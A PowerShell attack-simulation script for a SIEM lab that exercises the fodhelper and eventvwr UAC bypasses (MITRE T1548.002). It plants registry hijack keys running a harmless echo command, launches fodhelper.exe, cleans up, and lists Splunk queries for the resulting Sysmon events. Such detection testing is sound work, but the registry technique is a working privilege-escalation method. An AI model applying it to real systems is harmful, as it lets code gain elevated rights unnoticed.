<![CDATA[# ============================================================
# Atomic Red Team Simulation: T1548.002 — UAC Bypass
# Target: Windows Server (run locally on target)
# MITRE ATT&CK: T1548.002 — Bypass User Account Control
# ============================================================
#Requires -RunAsAdministrator

Write-Host "=============================================" -ForegroundColor Red
Write-Host " ATTACK SIMULATION: T1548.002 — UAC Bypass" -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""

# ── Method 1: Atomic Red Team ──
Write-Host "[*] Method 1: Atomic Red Team T1548.002..." -ForegroundColor Yellow
try {
    Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force -ErrorAction SilentlyContinue
    Invoke-AtomicTest T1548.002 -TestNumbers 1,2 -ErrorAction SilentlyContinue
    Write-Host "[✓] Atomic Red Team tests completed" -ForegroundColor Green
} catch {
    Write-Host "[!] Atomic Red Team not installed, using manual simulation" -ForegroundColor Yellow
}

# ── Method 2: Fodhelper UAC Bypass ──
Write-Host ""
Write-Host "[*] Method 2: Fodhelper UAC Bypass (ms-settings)..." -ForegroundColor Yellow

$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Create registry entries (generates Sysmon Event 13)
Write-Host "  [+] Creating ms-settings registry hijack..." -ForegroundColor Gray
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c echo SIEM-Lab-UAC-Bypass-Test > C:\Windows\Temp\uac_test.txt" -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null

Write-Host "[✓] Registry entries created (Sysmon Event 13 generated)" -ForegroundColor Green
Write-Host "  [+] Registry path: $regPath" -ForegroundColor Gray

# Launch fodhelper (would trigger the bypass in a real scenario)
Write-Host "  [+] Launching fodhelper.exe..." -ForegroundColor Gray
Start-Process fodhelper.exe -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# ── Cleanup ──
Write-Host ""
Write-Host "[*] Cleaning up registry modifications..." -ForegroundColor Yellow
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\uac_test.txt" -Force -ErrorAction SilentlyContinue
Write-Host "[✓] Registry cleanup complete" -ForegroundColor Green

# ── Method 3: EventVwr UAC Bypass Simulation ──
Write-Host ""
Write-Host "[*] Method 3: Event Viewer bypass (mscfile)..." -ForegroundColor Yellow

$mscRegPath = "HKCU:\Software\Classes\mscfile\Shell\Open\command"
New-Item -Path $mscRegPath -Force | Out-Null
Set-ItemProperty -Path $mscRegPath -Name "(Default)" -Value "cmd.exe /c echo SIEM-Lab-EventVwr-Bypass > C:\Windows\Temp\eventvwr_test.txt" -Force

Write-Host "[✓] mscfile registry entries created" -ForegroundColor Green

# Cleanup
Start-Sleep -Seconds 2
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\eventvwr_test.txt" -Force -ErrorAction SilentlyContinue
Write-Host "[✓] Cleanup complete" -ForegroundColor Green

Write-Host ""
Write-Host "[✓] UAC bypass simulation complete" -ForegroundColor Green
Write-Host "[*] Check Splunk: index=sysmon EventCode=13 TargetObject=*ms-settings*" -ForegroundColor Cyan
Write-Host "[*] Check Splunk: index=sysmon EventCode=1 Image=*fodhelper.exe*" -ForegroundColor Cyan
]]>
